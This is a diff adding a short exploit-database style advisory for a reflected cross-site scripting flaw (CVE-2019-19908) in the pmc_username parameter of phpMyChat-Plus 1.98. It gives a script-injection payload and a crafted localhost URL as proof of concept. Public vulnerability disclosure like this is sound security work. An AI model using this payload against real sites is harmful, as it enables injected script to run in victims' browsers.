@@ -1,0 +1,17 @@
+# Exploit Title: phpMyChat-Plus 1.98 - 'pmc_username' Reflected Cross-Site Scripting
+# Date: 2019-12-19
+# Exploit Author: Chris Inzinga
+# Vendor Homepage: http://ciprianmp.com/latest/
+# Download: https://sourceforge.net/projects/phpmychat/
+# Tested On: Linux & Mac
+# Version: 1.98
+# CVE: CVE-2019-19908
+
+Description: 
+The "pmc_username" parameter of pass_reset.php is vulnerable to reflected XSS
+
+Payload: 
+"><script>alert('xss')</script>
+
+Vulnerable URL: 
+http://localhost/plus/pass_reset.php?L=english&pmc_username="><script>alert('xss')</script>
